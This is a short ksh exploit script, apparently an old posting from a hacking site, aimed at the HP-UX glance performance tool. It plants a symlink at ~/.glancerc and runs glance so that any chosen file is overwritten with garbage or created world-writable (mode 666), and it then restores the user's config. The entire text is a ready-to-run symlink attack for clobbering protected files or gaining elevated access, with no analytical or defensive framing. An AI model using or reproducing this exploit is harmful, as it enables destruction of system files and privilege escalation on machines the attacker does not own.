#!/bin/ksh
#
# the one .traz

FILE=$1
PROGGIE=`basename $0`
GLANCE=/usr/perf/bin/glance

if [ -z "$1" ]
then
  echo "usage: $PROGGIE file_to_create_or_overwrite"
  exit
fi

if [ -f ~/.glancerc ]
then
  mv ~/.glancerc ~/.glancerc.old
fi

umask 0
ln -s $FILE ~/.glancerc
if [ -f $FILE ]
then
  echo "File exists -- will be overwritten with garbage"
else
  echo "File doesn't exist -- will be created mode 666"
  CREATE_666="yes"
fi
echo "Please wait about 10 seconds or so"
${GLANCE} -j 1 -iterations 1 > /dev/null 2>&1
if [ -n "${CREATE_666}" ]
then
  >$FILE
fi

rm ~/.glancerc
if [ -f ~/.glancerc.old ]
then
  mv ~/.glancerc.old ~/.glancerc
fi


#                 www.hack.co.za           [2000]#